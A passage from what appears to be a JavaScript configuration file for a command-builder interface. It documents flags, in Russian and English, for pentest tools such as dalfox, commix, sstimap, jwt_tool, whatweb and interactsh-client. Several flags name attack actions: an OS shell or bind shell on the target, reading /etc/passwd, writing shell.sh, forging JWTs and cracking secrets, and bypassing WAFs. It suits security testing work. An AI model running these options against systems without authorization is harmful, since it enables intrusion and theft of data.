      { id:'_ot', flag:'-oT', help: M('Output in text format', 'Output in text format'), value:'out.txt' },
      { id:'_ob', flag:'-oB', help: M('Output in a format suitable for Burp Suite', 'Output in a format suitable for Burp Suite') },
      { id:'_oj', flag:'-oJ', help: M('Output in JSON', 'Output in JSON'), value:'out.json' },
      { id:'_q', flag:'-q', help: M('Quiet mode (minimal output)', 'Quiet mode (minimal output)') },
    ],
  },
  {
    id: 'dalfox',
    name: 'dalfox',
    base: 'dalfox',
    desc: M('Быстрый XSS-сканер: auto mining параметров, DOM-XSS, обход WAF и blind-XSS callback.', 'A fast XSS scanner with automatic parameter mining, DOM-XSS checks, WAF bypass and blind-XSS callback integration.'),
    targetPlaceholder: 'url {TARGET}',
    flags: [
      { id:'url', flag:'url', help: M('Subcommand: scan a single URL (target is a positional argument)', 'Subcommand: scan a single URL (target is a positional argument)'), value:'{TARGET}' },
      { id:'file', flag:'file', help: M('Subcommand: scan a list of URLs from a file', 'Subcommand: scan a list of URLs from a file'), value:'urls.txt' },
      { id:'pipe', flag:'pipe', help: M('Subcommand: accept targets from stdin (pipeline)', 'Subcommand: accept targets from stdin (pipeline)') },
      { id:'sxss', flag:'sxss', help: M('Subcommand: stored-XSS mode', 'Subcommand: stored-XSS mode'), value:'{TARGET}' },
      { id:'_p', flag:'-p', help: M('Test only the specified parameter', 'Test only the specified parameter'), value:'q' },
      { id:'_d', flag:'-d', help: M('POST data', 'POST data'), value:'\'q=1\'' },
      { id:'_x', flag:'-X', help: M('HTTP request method', 'HTTP request method'), value:'POST' },
      { id:'__cookie', flag:'--cookie', help: M('Cookie header', 'Cookie header'), value:'\'sid=...\'' },
      { id:'_h', flag:'-H', help: M('Custom HTTP header', 'Custom HTTP header'), value:'\'X-Api: 1\'' },
      { id:'__user_agent', flag:'--user-agent', help: M('Custom User-Agent', 'Custom User-Agent'), value:'\'UA\'' },
      { id:'__proxy', flag:'--proxy', help: M('HTTP proxy', 'HTTP proxy'), value:'http://127.0.0.1:8080' },
      { id:'_f', flag:'-F', help: M('Follow redirects (--follow-redirects)', 'Follow redirects (--follow-redirects)') },
      { id:'__delay', flag:'--delay', help: M('Delay between requests, milliseconds', 'Delay between requests, milliseconds'), value:'0' },
      { id:'__timeout', flag:'--timeout', help: M('Request timeout, seconds', 'Request timeout, seconds'), value:'10' },
      { id:'_w', flag:'-w', help: M('Number of workers/threads (--worker)', 'Number of workers/threads (--worker)'), value:'100' },
      { id:'__custom_payload', flag:'--custom-payload', help: M('Custom file of XSS payloads', 'Custom file of XSS payloads'), value:'payloads.txt' },
      { id:'_b', flag:'-b', help: M('Callback URL for blind-XSS (--blind)', 'Callback URL for blind-XSS (--blind)'), value:'https://xss.ht' },
      { id:'__mining_dict', flag:'--mining-dict', help: M('Parameter mining by wordlist (enabled by default)', 'Parameter mining by wordlist (enabled by default)') },
      { id:'__mining_dom', flag:'--mining-dom', help: M('Parameter mining from the DOM (element name/id)', 'Parameter mining from the DOM (element name/id)') },
      { id:'__deep_domxss', flag:'--deep-domxss', help: M('Deeper DOM-XSS check via a headless browser', 'Deeper DOM-XSS check via a headless browser') },
      { id:'__remote_payloads', flag:'--remote-payloads', help: M('Pull payloads from a remote source', 'Pull payloads from a remote source'), value:'portswigger' },
      { id:'__waf_evasion', flag:'--waf-evasion', help: M('Enable WAF bypass (rate adjustment when a WAF is detected)', 'Enable WAF bypass (rate adjustment when a WAF is detected)') },
      { id:'__skip_bav', flag:'--skip-bav', help: M('Skip BAV checks (basic other vulns: SQLi, SSTI etc.)', 'Skip BAV checks (basic other vulns: SQLi, SSTI etc.)') },
      { id:'__skip_grepping', flag:'--skip-grepping', help: M('Skip response grepping by built-in patterns', 'Skip response grepping by built-in patterns') },
      { id:'__skip_mining_dom', flag:'--skip-mining-dom', help: M('Do not mine parameters from the DOM', 'Do not mine parameters from the DOM') },
      { id:'__skip_mining_dict', flag:'--skip-mining-dict', help: M('Do not mine parameters by wordlist', 'Do not mine parameters by wordlist') },
      { id:'__grep', flag:'--grep', help: M('Custom grep patterns to search in responses', 'Custom grep patterns to search in responses'), value:'patterns.json' },
      { id:'_o', flag:'-o', help: M('Save the result to a file', 'Save the result to a file'), value:'out.txt' },
      { id:'__format', flag:'--format', help: M('Output format: plain / json / jsonl', 'Output format: plain / json / jsonl'), value:'json' },
      { id:'_s', flag:'-S', help: M('Quiet mode, findings only (--silence)', 'Quiet mode, findings only (--silence)') },
      { id:'__only_poc', flag:'--only-poc', help: M('Output only PoC (ready confirmations)', 'Output only PoC (ready confirmations)') },
      { id:'__no_color', flag:'--no-color', help: M('Disable colored output', 'Disable colored output') },
      { id:'__found_action', flag:'--found-action', help: M('Run a command when XSS is found', 'Run a command when XSS is found'), value:'\'cmd\'' },
    ],
  },
  {
    id: 'commix',
    name: 'commix',
    base: 'commix',
    desc: M('Автопоиск и эксплуатация OS command injection: от параметра до shell, read/write файлов и сбора system info.', 'Automates finding and exploiting OS command injection: from detecting the parameter to a shell, reading/writing files and gathering system info.'),
    targetPlaceholder: '-u {TARGET}',
    flags: [
      { id:'_u', flag:'-u', help: M('Target URL with a parameter', 'Target URL with a parameter'), value:'{TARGET}' },
      { id:'_r', flag:'-r', help: M('Load the HTTP request from a file', 'Load the HTTP request from a file'), value:'req.txt' },
      { id:'_m', flag:'-m', help: M('Scan multiple targets from a file', 'Scan multiple targets from a file'), value:'urls.txt' },
      { id:'__crawl', flag:'--crawl', help: M('Crawl the site to the given depth', 'Crawl the site to the given depth'), value:'1' },
      { id:'__data', flag:'--data', help: M('POST data to test', 'POST data to test'), value:'\'id=1\'' },
      { id:'__cookie', flag:'--cookie', help: M('Cookie header', 'Cookie header'), value:'\'sid=...\'' },
      { id:'_p', flag:'-p', help: M('Test only the specified parameters', 'Test only the specified parameters'), value:'id' },
      { id:'_h', flag:'-H', help: M('Additional HTTP header', 'Additional HTTP header'), value:'\'X-Up: 1\'' },
      { id:'__host', flag:'--host', help: M('Host header', 'Host header'), value:'host' },
      { id:'__referer', flag:'--referer', help: M('Referer header', 'Referer header'), value:'url' },
      { id:'__user_agent', flag:'--user-agent', help: M('Custom User-Agent', 'Custom User-Agent'), value:'\'UA\'' },
      { id:'__random_agent', flag:'--random-agent', help: M('Random User-Agent', 'Random User-Agent') },
      { id:'__proxy', flag:'--proxy', help: M('Proxy for traffic', 'Proxy for traffic'), value:'http://127.0.0.1:8080' },
      { id:'__tor', flag:'--tor', help: M('Use the Tor network', 'Use the Tor network') },
      { id:'__timeout', flag:'--timeout', help: M('Connection timeout, seconds', 'Connection timeout, seconds'), value:'30' },
      { id:'__level', flag:'--level', help: M('Test depth 1-3: 1=basic, 2=+Cookie, 3=+HTTP headers', 'Test depth 1-3: 1=basic, 2=+Cookie, 3=+HTTP headers'), value:'1' },
      { id:'__technique', flag:'--technique', help: M('Injection techniques: c=classic (output right in the response), e=eval-based (dynamic eval), t=time-based blind, f=file-based (write to a file and read)', 'Injection techniques: c=classic (output right in the response), e=eval-based (dynamic eval), t=time-based blind, f=file-based (write to a file and read)'), value:'cetf' },
      { id:'__skip_technique', flag:'--skip-technique', help: M('Exclude the specified techniques', 'Exclude the specified techniques'), value:'t' },
      { id:'__prefix', flag:'--prefix', help: M('String before the payload', 'String before the payload'), value:'\';\'' },
      { id:'__suffix', flag:'--suffix', help: M('String after the payload', 'String after the payload'), value:'\'#\'' },
      { id:'__os', flag:'--os', help: M('Force the OS (Unix/Windows)', 'Force the OS (Unix/Windows)'), value:'Unix' },
      { id:'__smart', flag:'--smart', help: M('Deep test only on positive heuristics', 'Deep test only on positive heuristics') },
      { id:'__os_cmd', flag:'--os-cmd', help: M('Run a single OS command', 'Run a single OS command'), value:'\'id\'' },
      { id:'__os_shell', flag:'--os-shell', help: M('Interactive OS shell on the target', 'Interactive OS shell on the target') },
      { id:'__alter_shell', flag:'--alter-shell', help: M('Use an alternative shell (e.g. Python)', 'Use an alternative shell (e.g. Python)'), value:'Python' },
      { id:'__all', flag:'--all', help: M('Gather all available system information', 'Gather all available system information') },
      { id:'__current_user', flag:'--current-user', help: M('Current OS user', 'Current OS user') },
      { id:'__hostname', flag:'--hostname', help: M('System hostname', 'System hostname') },
      { id:'__is_root', flag:'--is-root', help: M('Check whether the user is root (Unix)', 'Check whether the user is root (Unix)') },
      { id:'__is_admin', flag:'--is-admin', help: M('Check administrator privileges (Windows)', 'Check administrator privileges (Windows)') },
      { id:'__sys_info', flag:'--sys-info', help: M('OS and system information', 'OS and system information') },
      { id:'__file_read', flag:'--file-read', help: M('Read a file from the target', 'Read a file from the target'), value:'/etc/passwd' },
      { id:'__file_write', flag:'--file-write', help: M('Write a local file to the target', 'Write a local file to the target'), value:'shell.sh' },
      { id:'__tamper', flag:'--tamper', help: M('Obfuscate payloads with tamper scripts to bypass filters/WAF', 'Obfuscate payloads with tamper scripts to bypass filters/WAF'), value:'space2ifs' },
      { id:'__list_tampers', flag:'--list-tampers', help: M('Show available tamper scripts', 'Show available tamper scripts') },
      { id:'__skip_waf', flag:'--skip-waf', help: M('Skip WAF/IPS detection', 'Skip WAF/IPS detection') },
      { id:'__shellshock', flag:'--shellshock', help: M('Test for Shellshock (CVE-2014-6271) in CGI', 'Test for Shellshock (CVE-2014-6271) in CGI') },
      { id:'__batch', flag:'--batch', help: M('Ask no questions - use the default answers', 'Ask no questions - use the default answers') },
      { id:'__delay', flag:'--delay', help: M('Delay between requests, seconds', 'Delay between requests, seconds'), value:'0' },
      { id:'__flush_session', flag:'--flush-session', help: M('Reset the saved session', 'Reset the saved session') },
    ],
  },
  {
    id: 'sstimap',
    name: 'sstimap',
    base: 'sstimap',
    desc: M('Ищет и эксплуатирует SSTI в десятках движков (Jinja2, Twig, Freemarker, ERB…): от детекта до eval, OS shell и операций с файлами.', 'Finds and exploits Server-Side Template Injection in dozens of engines (Jinja2, Twig, Freemarker, ERB and others): from detection to eval-code, an OS shell and file operations.'),
    targetPlaceholder: '-u {TARGET}',
    flags: [
      { id:'_u', flag:'-u', help: M('Target URL', 'Target URL'), value:'{TARGET}' },
      { id:'_r', flag:'-r', help: M('Load the HTTP request from a file', 'Load the HTTP request from a file'), value:'req.txt' },
      { id:'_d', flag:'-d', help: M('POST data', 'POST data'), value:'\'q=1\'' },
      { id:'_c', flag:'-c', help: M('HTTP Cookie', 'HTTP Cookie'), value:'\'sid=...\'' },
      { id:'_h', flag:'-H', help: M('Custom HTTP header', 'Custom HTTP header'), value:'\'X-Api: 1\'' },
      { id:'__method', flag:'--method', help: M('HTTP request method', 'HTTP request method'), value:'POST' },
      { id:'_p', flag:'-p', help: M('Test a specific parameter', 'Test a specific parameter'), value:'name' },
      { id:'_e', flag:'-e', help: M('Force the template engine (--engine)', 'Force the template engine (--engine)'), value:'Jinja2' },
      { id:'_t', flag:'-t', help: M('Detection technique: render / blind (--technique)', 'Detection technique: render / blind (--technique)'), value:'render' },
      { id:'_o', flag:'-O', help: M('Force the target OS (--os)', 'Force the target OS (--os)'), value:'linux' },
      { id:'_lvl', flag:'-lvl', help: M('Check intensity level (--level)', 'Check intensity level (--level)'), value:'1' },
      { id:'__crawl', flag:'--crawl', help: M('Crawl the site and find forms', 'Crawl the site and find forms'), value:'1' },
      { id:'__forms', flag:'--forms', help: M('Find and test HTML forms', 'Find and test HTML forms') },
      { id:'_a', flag:'-A', help: M('Custom User-Agent (--user-agent)', 'Custom User-Agent (--user-agent)'), value:'\'UA\'' },
      { id:'__random_agent', flag:'--random-agent', help: M('Random User-Agent', 'Random User-Agent') },
      { id:'__proxy', flag:'--proxy', help: M('HTTP proxy', 'HTTP proxy'), value:'http://127.0.0.1:8080' },
      { id:'__tamper', flag:'--tamper', help: M('Tamper scripts for payload obfuscation', 'Tamper scripts for payload obfuscation'), value:'script' },
      { id:'__force_overwrite', flag:'--force-overwrite', help: M('Overwrite without safe restrictions', 'Overwrite without safe restrictions') },
      { id:'_x', flag:'-x', help: M('Execute code in the template language (--eval)', 'Execute code in the template language (--eval)'), value:'\'7*7\'' },
      { id:'_s', flag:'-s', help: M('Interactive OS shell (--shell)', 'Interactive OS shell (--shell)') },
      { id:'_i', flag:'-i', help: M('Interactive mode (--interactive)', 'Interactive mode (--interactive)') },
      { id:'_b', flag:'-B', help: M('Bind shell on a port (--bind-shell)', 'Bind shell on a port (--bind-shell)'), value:'4444' },
    ],
  },
  {
    id: 'python3-jwt-tool-py',
    name: 'python3 jwt_tool.py',
    base: 'python3 jwt_tool.py',
    desc: M('Швейцарский нож JWT: разбор и правка токенов, типовые misconfig (alg:none, key confusion, null-signature), крэк слабого secret и своя подпись.', 'A Swiss army knife for JWT: parsing and tampering tokens, checking common misconfigs (alg:none, key confusion, null-signature), cracking a weak secret and signing your own tokens.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'', flag:'', help: M('The JWT itself is passed as a positional argument (the token to analyze/attack)', 'The JWT itself is passed as a positional argument (the token to analyze/attack)'), value:'{TARGET}' },
      { id:'_t', flag:'-t', help: M('URL to send the token to and check the reaction (--targeturl)', 'URL to send the token to and check the reaction (--targeturl)'), value:'https://site/api' },
      { id:'_rc', flag:'-rc', help: M('Cookies containing the token (--cookies)', 'Cookies containing the token (--cookies)'), value:'\'jwt=...\'' },
      { id:'_rh', flag:'-rh', help: M('HTTP request headers (--headers)', 'HTTP request headers (--headers)'), value:'\'Authorization: Bearer ...\'' },
      { id:'_pd', flag:'-pd', help: M('POST data for the request (--postdata)', 'POST data for the request (--postdata)'), value:'\'data\'' },
      { id:'_cv', flag:'-cv', help: M('Canary: expected text in a successful response (for auto-scoring)', 'Canary: expected text in a successful response (for auto-scoring)'), value:'\'Welcome\'' },
      { id:'_m', flag:'-M', help: M('Scan mode (--mode): pb=playbook (common misconfigs), at=all tests, cc=claim fuzzing, er=error forcing, cf=config check', 'Scan mode (--mode): pb=playbook (common misconfigs), at=all tests, cc=claim fuzzing, er=error forcing, cf=config check'), value:'pb' },
      { id:'_x', flag:'-X', help: M('Attack type (--exploit): a=alg:none (signature bypass), n=key confusion RS/HS256, b=empty password, s=null-signature, k=key injection into the token, i=inline JWKS injection', 'Attack type (--exploit): a=alg:none (signature bypass), n=key confusion RS/HS256, b=empty password, s=null-signature, k=key injection into the token, i=inline JWKS injection'), value:'a' },
      { id:'_i', flag:'-I', help: M('Inject/modify claims in the token (with -pc/-pv for the payload, -hc/-hv for the header)', 'Inject/modify claims in the token (with -pc/-pv for the payload, -hc/-hv for the header)') },
      { id:'_pc', flag:'-pc', help: M('Claim name in the payload (--pclaim)', 'Claim name in the payload (--pclaim)'), value:'user' },
      { id:'_pv', flag:'-pv', help: M('Claim value in the payload (--pvalue)', 'Claim value in the payload (--pvalue)'), value:'admin' },
      { id:'_hc', flag:'-hc', help: M('Claim name in the header', 'Claim name in the header'), value:'kid' },
      { id:'_hv', flag:'-hv', help: M('Claim value in the header', 'Claim value in the header'), value:'../../x' },
      { id:'_s', flag:'-S', help: M('Algorithm for re-signing the token (--sign): hs256/rs256/none and others', 'Algorithm for re-signing the token (--sign): hs256/rs256/none and others'), value:'hs256' },
      { id:'_k', flag:'-k', help: M('Key file (PEM) for signing/verification (--keyfile)', 'Key file (PEM) for signing/verification (--keyfile)'), value:'key.pem' },
      { id:'_p', flag:'-p', help: M('Password/secret for signing or verification (--password)', 'Password/secret for signing or verification (--password)'), value:'secret' },
      { id:'_c', flag:'-C', help: M('Crack a weak HMAC secret with a wordlist (--crack)', 'Crack a weak HMAC secret with a wordlist (--crack)') },
      { id:'_d', flag:'-d', help: M('Wordlist for cracking the secret (--dict)', 'Wordlist for cracking the secret (--dict)'), value:'rockyou.txt' },
      { id:'_v', flag:'-V', help: M('Verify the token signature with a given key (--verify)', 'Verify the token signature with a given key (--verify)') },
    ],
  },
  {
    id: 'whatweb',
    name: 'whatweb',
    base: 'whatweb',
    desc: M('Fingerprint сайта: CMS, фреймворки, серверы, библиотеки, аналитика, версии — 1800+ технологий по сигнатурам. Быстро понять, на чём сайт.', 'Fingerprints a web site: identifies CMS, frameworks, servers, libraries, analytics, versions and over 1800 technologies by signatures. A fast way to understand what a site is built on.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'_i', flag:'-i', help: M('Read a list of targets from a file (--input-file)', 'Read a list of targets from a file (--input-file)'), value:'urls.txt' },
      { id:'_a', flag:'-a', help: M('Aggression level: 1 stealthy (1 request), 3 aggressive (extra requests on a match), 4 heavy (many requests, all aggressive plugins)', 'Aggression level: 1 stealthy (1 request), 3 aggressive (extra requests on a match), 4 heavy (many requests, all aggressive plugins)'), value:'3' },
      { id:'_u', flag:'-U', help: M('Spoof the User-Agent (--user-agent)', 'Spoof the User-Agent (--user-agent)'), value:'Mozilla/5.0' },
      { id:'_h', flag:'-H', help: M('Add an arbitrary HTTP header (--header)', 'Add an arbitrary HTTP header (--header)'), value:'X-Forwarded-For: 127.0.0.1' },
      { id:'_c', flag:'-c', help: M('Pass cookies (--cookie), format name=value; name2=value2', 'Pass cookies (--cookie), format name=value; name2=value2'), value:'session=abc' },
      { id:'__follow_redirect', flag:'--follow-redirect', help: M('Behavior on redirects: never, http-only, meta-only, same-site, always', 'Behavior on redirects: never, http-only, meta-only, same-site, always'), value:'always' },
      { id:'__proxy', flag:'--proxy', help: M('Use an HTTP proxy (default port 8080)', 'Use an HTTP proxy (default port 8080)'), value:'127.0.0.1:8080' },
      { id:'__proxy_user', flag:'--proxy-user', help: M('Login and password for the proxy', 'Login and password for the proxy'), value:'user:pass' },
      { id:'_p', flag:'-p', help: M('Run only the selected plugins (--plugins), supports +/-', 'Run only the selected plugins (--plugins), supports +/-'), value:'WordPress,Apache' },
      { id:'_l', flag:'-l', help: M('Show the list of all available plugins (--list-plugins)', 'Show the list of all available plugins (--list-plugins)') },
      { id:'__search_plugins', flag:'--search-plugins', help: M('Search plugins by keyword', 'Search plugins by keyword'), value:'cms' },
      { id:'_t', flag:'-t', help: M('Number of threads (--max-threads, default 25)', 'Number of threads (--max-threads, default 25)'), value:'25' },
      { id:'__open_timeout', flag:'--open-timeout', help: M('Connection establishment timeout in seconds', 'Connection establishment timeout in seconds'), value:'15' },
      { id:'__read_timeout', flag:'--read-timeout', help: M('Response read timeout in seconds', 'Response read timeout in seconds'), value:'30' },
      { id:'__wait', flag:'--wait', help: M('Pause between connections in seconds (useful with 1 thread)', 'Pause between connections in seconds (useful with 1 thread)'), value:'1' },
      { id:'_v', flag:'-v', help: M('Verbose output with plugin descriptions (--verbose); twice - debug', 'Verbose output with plugin descriptions (--verbose); twice - debug') },
      { id:'_q', flag:'-q', help: M('Quiet mode - do not print the brief log to stdout (--quiet)', 'Quiet mode - do not print the brief log to stdout (--quiet)') },
      { id:'__colour', flag:'--colour', help: M('Output color control: never, always, auto', 'Output color control: never, always, auto'), value:'always' },
      { id:'__no_errors', flag:'--no-errors', help: M('Hide error messages', 'Hide error messages') },
      { id:'__log_brief', flag:'--log-brief', help: M('Log to a brief single-line grep format', 'Log to a brief single-line grep format'), value:'out.txt' },
      { id:'__log_verbose', flag:'--log-verbose', help: M('Log to a human-readable format', 'Log to a human-readable format'), value:'out.txt' },
      { id:'__log_json', flag:'--log-json', help: M('Log in JSON format', 'Log in JSON format'), value:'out.json' },
      { id:'__log_xml', flag:'--log-xml', help: M('Log in XML format', 'Log in XML format'), value:'out.xml' },
    ],
  },
  {
    id: 'wafw00f',
    name: 'wafw00f',
    base: 'wafw00f',
    desc: M('Определяет, стоит ли WAF перед сайтом и какой именно — Cloudflare, Akamai, AWS WAF, Imperva и ~150 продуктов. Понятно, почему режут payload и куда копать bypass.', 'Determines whether a web firewall (WAF) sits in front of a site and which one exactly - Cloudflare, Akamai, AWS WAF, Imperva and about 150 more products. Helps understand why payloads are blocked and which bypass to look for.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'_i', flag:'-i', help: M('Read targets from a file (--input), format csv/json/text', 'Read targets from a file (--input), format csv/json/text'), value:'urls.txt' },
      { id:'_a', flag:'-a', help: M('Find ALL matched WAFs, do not stop at the first (--findall)', 'Find ALL matched WAFs, do not stop at the first (--findall)') },
      { id:'_r', flag:'-r', help: M('Do not follow 3xx redirects (--noredirect)', 'Do not follow 3xx redirects (--noredirect)') },
      { id:'_t', flag:'-t', help: M('Check only one specific WAF (--test); see the names in -l', 'Check only one specific WAF (--test); see the names in -l'), value:'Cloudflare' },
      { id:'_l', flag:'-l', help: M('Show the list of all WAFs it can detect (--list)', 'Show the list of all WAFs it can detect (--list)') },
      { id:'_p', flag:'-p', help: M('Use an HTTP proxy for requests (--proxy)', 'Use an HTTP proxy for requests (--proxy)'), value:'http://127.0.0.1:8080' },
      { id:'_h', flag:'-H', help: M('File with custom headers on top of the standard ones (--headers)', 'File with custom headers on top of the standard ones (--headers)'), value:'headers.txt' },
      { id:'_v', flag:'-v', help: M('Verbose output; repeating -v increases detail (--verbose)', 'Verbose output; repeating -v increases detail (--verbose)') },
      { id:'_o', flag:'-o', help: M('Save output to a file; format by extension csv/json/text (--output)', 'Save output to a file; format by extension csv/json/text (--output)'), value:'result.json' },
      { id:'_f', flag:'-f', help: M('Force output format: csv, json, text (--format)', 'Force output format: csv, json, text (--format)'), value:'json' },
      { id:'__no_colors', flag:'--no-colors', help: M('Disable ANSI colors in the output', 'Disable ANSI colors in the output') },
    ],
  },
  {
    id: 'gospider',
    name: 'gospider',
    base: 'gospider',
    desc: M('Быстрый Go-spider: рекурсивно обходит сайт, вытаскивает ссылки, формы, эндпоинты и URL из JS, robots.txt и sitemap. Плюс внешние источники (archive.org, CommonCrawl). База для attack surface.', 'A fast Go spider: recursively walks a site, extracts links, forms, endpoints and URLs from JS files, robots.txt and the sitemap. Can also pull URLs from external sources (archive.org, CommonCrawl). A foundation for collecting attack surface.'),
    targetPlaceholder: '-s {TARGET}',
    flags: [
      { id:'_s', flag:'-s', help: M('A single site to crawl (--site)', 'A single site to crawl (--site)'), value:'{TARGET}' },
      { id:'_o', flag:'-o', help: M('Folder to save the results (--output)', 'Folder to save the results (--output)'), value:'out_dir' },
      { id:'__js', flag:'--js', help: M('Find links inside JS files via LinkFinder (on by default)', 'Find links inside JS files via LinkFinder (on by default)') },
      { id:'__sitemap', flag:'--sitemap', help: M('Try to crawl sitemap.xml', 'Try to crawl sitemap.xml') },
      { id:'__robots', flag:'--robots', help: M('Try to crawl robots.txt (on by default)', 'Try to crawl robots.txt (on by default)') },
      { id:'_a', flag:'-a', help: M('Pull URLs from third-party sources: Archive.org, CommonCrawl, VirusTotal, AlienVault (--other-source)', 'Pull URLs from third-party sources: Archive.org, CommonCrawl, VirusTotal, AlienVault (--other-source)') },
      { id:'_w', flag:'-w', help: M('Include subdomains from third-party sources (--include-subs, together with -a)', 'Include subdomains from third-party sources (--include-subs, together with -a)') },
      { id:'_r', flag:'-r', help: M('Also crawl/request URLs from third-party sources (--include-other-source)', 'Also crawl/request URLs from third-party sources (--include-other-source)') },
      { id:'__subs', flag:'--subs', help: M('Include subdomains while crawling', 'Include subdomains while crawling') },
      { id:'_d', flag:'-d', help: M('Crawl recursion depth; 0 = unlimited (--depth, default 1)', 'Crawl recursion depth; 0 = unlimited (--depth, default 1)'), value:'3' },
      { id:'__whitelist', flag:'--whitelist', help: M('Regex: crawl only matching URLs', 'Regex: crawl only matching URLs'), value:'/api/' },
      { id:'__blacklist', flag:'--blacklist', help: M('Regex: exclude matching URLs', 'Regex: exclude matching URLs'), value:'logout' },
      { id:'__whitelist_domain', flag:'--whitelist-domain', help: M('Allowed domain to crawl', 'Allowed domain to crawl'), value:'example.com' },
      { id:'_l', flag:'-L', help: M('Filter by response length (--filter-length)', 'Filter by response length (--filter-length)'), value:'100' },
      { id:'_u', flag:'-u', help: M('User-Agent: web (random desktop), mobi or a custom string (--user-agent)', 'User-Agent: web (random desktop), mobi or a custom string (--user-agent)'), value:'web' },
      { id:'_h', flag:'-H', help: M('Add a header; the flag can be repeated (--header)', 'Add a header; the flag can be repeated (--header)'), value:'X-Test: 1' },
      { id:'__cookie', flag:'--cookie', help: M('Pass cookies', 'Pass cookies'), value:'session=abc' },
      { id:'__burp', flag:'--burp', help: M('Load headers and cookies from a raw Burp HTTP request', 'Load headers and cookies from a raw Burp HTTP request'), value:'req.txt' },
      { id:'_p', flag:'-p', help: M('Proxy (--proxy)', 'Proxy (--proxy)'), value:'http://127.0.0.1:8080' },
      { id:'__no_redirect', flag:'--no-redirect', help: M('Do not follow redirects', 'Do not follow redirects') },
      { id:'_t', flag:'-t', help: M('Number of threads - sites in parallel (--threads, default 1)', 'Number of threads - sites in parallel (--threads, default 1)'), value:'5' },
      { id:'_c', flag:'-c', help: M('Max concurrent requests to a single domain (--concurrent, default 5)', 'Max concurrent requests to a single domain (--concurrent, default 5)'), value:'5' },
      { id:'_k', flag:'-k', help: M('Pause in seconds before a new request (--delay)', 'Pause in seconds before a new request (--delay)'), value:'1' },
      { id:'_m', flag:'-m', help: M('Request timeout in seconds (--timeout, default 10)', 'Request timeout in seconds (--timeout, default 10)'), value:'10' },
      { id:'__json', flag:'--json', help: M('Output in JSON format', 'Output in JSON format') },
      { id:'_q', flag:'-q', help: M('Quiet mode - show only found URLs (--quiet)', 'Quiet mode - show only found URLs (--quiet)') },
      { id:'_v', flag:'-v', help: M('Verbose output (--verbose)', 'Verbose output (--verbose)') },
      { id:'__debug', flag:'--debug', help: M('Debug mode', 'Debug mode') },
      { id:'_b', flag:'-B', help: M('HTML content only, everything else disabled (--base)', 'HTML content only, everything else disabled (--base)') },
    ],
  },
  {
    id: 'hakrawler',
    name: 'hakrawler',
    base: 'hakrawler',
    desc: M('Простой быстрый Go-spider для URL и эндпоинтов. Читает цели из STDIN, удобен в пайпах (subfinder | httpx | hakrawler). Минимум настроек — максимум скорости.', 'A simple fast Go spider for collecting URLs and endpoints. Reads targets from STDIN and fits well into pipelines (subfinder | httpx | hakrawler). Minimum settings - maximum speed.'),
    targetPlaceholder: 'TARGET',
    flags: [
      { id:'_stdin_', flag:'(stdin)', help: M('Targets are read from STDIN line by line: echo {TARGET} | hakrawler or cat urls.txt | hakrawler', 'Targets are read from STDIN line by line: echo {TARGET} | hakrawler or cat urls.txt | hakrawler') },
      { id:'_d', flag:'-d', help: M('Crawl depth (default 2)', 'Crawl depth (default 2)'), value:'2' },
      { id:'_subs', flag:'-subs', help: M('Include subdomains while crawling', 'Include subdomains while crawling') },
      { id:'_i', flag:'-i', help: M('Crawl only within the path (scope restriction)', 'Crawl only within the path (scope restriction)') },
      { id:'_dr', flag:'-dr', help: M('Do not follow HTTP redirects', 'Do not follow HTTP redirects') },
      { id:'_h', flag:'-h', help: M('Custom headers; multiple are separated by a double ;;', 'Custom headers; multiple are separated by a double ;;'), value:'Cookie: a=b;;X-Test: 1' },
      { id:'_insecure', flag:'-insecure', help: M('Disable TLS certificate verification', 'Disable TLS certificate verification') },
      { id:'_proxy', flag:'-proxy', help: M('Proxy URL', 'Proxy URL'), value:'http://127.0.0.1:8080' },
      { id:'_timeout', flag:'-timeout', help: M('Max time to crawl a single URL in seconds (-1 = no limit)', 'Max time to crawl a single URL in seconds (-1 = no limit)'), value:'10' },
      { id:'_size', flag:'-size', help: M('Page size limit in KB (-1 = no limit)', 'Page size limit in KB (-1 = no limit)'), value:'1000' },
      { id:'_t', flag:'-t', help: M('Number of threads (default 8)', 'Number of threads (default 8)'), value:'8' },
      { id:'_u', flag:'-u', help: M('Show only unique URLs', 'Show only unique URLs') },
      { id:'_json', flag:'-json', help: M('Output in JSON format', 'Output in JSON format') },
      { id:'_s', flag:'-s', help: M('Show the source of each URL (href, form, script)', 'Show the source of each URL (href, form, script)') },
      { id:'_w', flag:'-w', help: M('Show on which page the URL was found', 'Show on which page the URL was found') },
    ],
  },
  {
    id: 'paramspider',
    name: 'paramspider',
    base: 'paramspider',
    desc: M('Тянет из Wayback Machine исторические URL домена с GET-параметрами и подставляет FUZZ вместо значений. Готовый список под fuzz XSS/SQLi/LFI.', 'Pulls from the Wayback Machine (web.archive.org) all historical URLs of a domain that have GET parameters and replaces the parameter values with the FUZZ placeholder. A ready list of targets for fuzzing XSS/SQLi/LFI and the like.'),
    targetPlaceholder: '-d {TARGET}',
    flags: [
      { id:'_d', flag:'-d', help: M('Target domain for collecting URLs from the Wayback Machine (--domain)', 'Target domain for collecting URLs from the Wayback Machine (--domain)'), value:'{TARGET}' },
      { id:'_l', flag:'-l', help: M('File with a list of domains - batch mode (--list)', 'File with a list of domains - batch mode (--list)'), value:'domains.txt' },
      { id:'_p', flag:'-p', help: M('Placeholder instead of parameter values (--placeholder, default FUZZ)', 'Placeholder instead of parameter values (--placeholder, default FUZZ)'), value:'FUZZ' },
      { id:'_s', flag:'-s', help: M('Stream found URLs straight to the terminal as they are processed (--stream)', 'Stream found URLs straight to the terminal as they are processed (--stream)') },
      { id:'__proxy', flag:'--proxy', help: M('Proxy address for requests', 'Proxy address for requests'), value:'127.0.0.1:8080' },
    ],
  },
  {
    id: 'interactsh-client',
    name: 'interactsh-client',
    base: 'interactsh-client',
    desc: M('Open-source аналог Burp Collaborator для blind-багов. Клиент выдаёт домен вида xxxx.oast.pro — кладёшь в payload (SSRF, blind XXE/RCE/SQLi). Когда цель сама резолвит/стучится, клиент показывает DNS/HTTP/SMTP ping с IP, временем и протоколом — proof срабатывания.', 'An open-source analog of Burp Collaborator for blind vulnerabilities. You run the client - it hands out a unique domain like xxxx.oast.pro. You put that domain into a payload (SSRF, blind XXE, blind RCE, blind SQLi). When the target server itself resolves/requests the domain, the client prints the incoming DNS/HTTP/SMTP ping with the IP, time and protocol - which proves the vulnerability fired.'),
    targetPlaceholder: 'TARGET',
    flags: [
